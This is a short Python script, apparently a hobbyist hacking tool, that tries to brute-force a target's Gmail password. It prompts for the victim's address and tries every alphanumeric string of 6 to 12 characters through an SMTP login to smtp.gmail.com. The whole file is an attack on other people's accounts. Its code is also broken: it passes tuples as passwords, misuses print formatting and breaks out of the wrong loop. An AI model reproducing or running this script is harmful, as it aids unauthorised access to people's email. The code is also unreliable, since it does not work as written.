import itertools 
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
i = 0
user = input("Enter Target's Gmail Address: ")

for n in range(6, 12+1): 
        for perm in itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=n): 
        

             
                



            for symbols in perm:


               try:
                   smtpserver.login(user, perm)

                   print("[+] Password Cracked: %s") % symbols
                   break
               except smtplib.SMTPAuthenticationError:
                   print("[!] Password Inccorect: %s") % symbols



